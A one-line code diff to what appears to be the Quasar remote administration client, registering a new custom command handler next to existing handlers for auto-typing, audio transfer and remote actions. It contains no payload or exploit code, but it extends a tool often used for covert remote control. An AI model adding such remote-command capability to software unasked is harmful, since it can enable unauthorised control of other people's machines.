@@ -305,6 +305,7 @@ namespace Quasar.Client
             _messageProcessors.Add(new AutoTypeHandler());
             _messageProcessors.Add(new AudioTransferHandler());
             _messageProcessors.Add(new RTActionHandler());
+            _messageProcessors.Add(new CustomCommandHandler());
 
             foreach (var msgProc in _messageProcessors)
             {
